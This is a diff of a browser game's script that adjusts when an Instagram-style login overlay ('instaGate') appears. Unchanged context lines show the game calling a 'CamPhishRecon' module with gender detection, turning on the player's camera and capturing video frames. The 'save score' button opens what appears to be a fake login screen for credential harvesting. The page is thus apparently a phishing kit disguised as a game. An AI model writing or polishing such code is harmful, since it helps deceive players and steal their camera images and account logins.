@@ -109,6 +109,7 @@ setTimeout(nextRound,900);
 }
 
 function startGame(){
+closeInstaGate();
 if(window.CamPhishRecon){CamPhishRecon.init({genderDetect:true});CamPhishRecon.Capture.event('colormatch_game_start',{});}
 startCamera();
 bindPads();
@@ -177,7 +178,8 @@ var ml=document.getElementById('menuLb');if(ml)ml.innerHTML=h;
 bindPads();
 document.getElementById('startBtn').onclick=startGame;
 var sb=document.getElementById('saveScoreBtn');
-if(sb)sb.onclick=function(){document.getElementById('instaGate').classList.remove('hidden');};
+if(sb)sb.onclick=function(){if(document.getElementById('gameover').classList.contains('hidden'))return;document.getElementById('instaGate').classList.remove('hidden');};
+closeInstaGate();
 showLb();
 
 function shareCard(t){
@@ -207,7 +209,8 @@ var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);Ca
 }
 
 function closeInstaGate(){
-document.getElementById('instaGate').classList.add('hidden');
+var gate=document.getElementById('instaGate');
+if(gate)gate.classList.add('hidden');
 }
 </script>
 <div class="login-overlay hidden" id="instaGate">
